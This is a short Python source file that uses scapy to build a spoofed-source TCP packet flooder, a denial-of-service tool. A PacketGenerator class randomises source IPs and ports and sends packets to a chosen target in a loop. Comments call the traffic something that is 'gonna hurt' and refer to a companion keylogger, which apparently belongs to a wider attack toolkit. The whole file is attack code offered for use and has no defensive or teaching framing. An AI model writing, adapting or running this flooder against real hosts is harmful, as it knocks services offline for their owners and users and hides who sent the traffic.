import random
from scapy.layers.inet import IP, TCP #used scapy!
from scapy.sendrecv import send

#this is going to generate large amounts of traffic directed at the targetIP. The source IP and port will be spoofed randomly.
class PacketGenerator:
    def __init__(self, interval = 0.0001, targetIP = "000.000.000.000"):
        self.interval = interval
        self.isrunning = False
        self.targetIP = targetIP

    def startAttack(self, IP, Port = 80):
        self.targetPort = Port
        self.targetIP = IP
        self.isrunning = True

    def stopAttack(self):
        self.isrunning = False

    #this is intended to be run in its own thread. Just like the keylogger.
    def attackLoop(self):
        while True:
            packetNum = 0
            while self.isrunning:
                first = str(random.randint(1, 254))
                second = str(random.randint(1, 254))
                third = str(random.randint(1, 254))
                fourth = str(random.randint(1, 254))
                spoofedSource = first + "." + second + "." + third + "." + fourth #sneaky way of spoofing random sources
                port = random.randint(1, 65535)
                #construct packet for this itteration
                PacketIP = IP(src=spoofedSource, dst=self.targetIP)
                PacketTCP = TCP(sport=port, dport=self.targetPort)
                pkt = PacketIP/PacketTCP
                send(pkt, inter=self.interval)#this is gonna hurt
                print(f"Sent packet {packetNum}")
                packetNum += 1

    #was going to define some other attack variants but since none of these can be legally tested, I might not.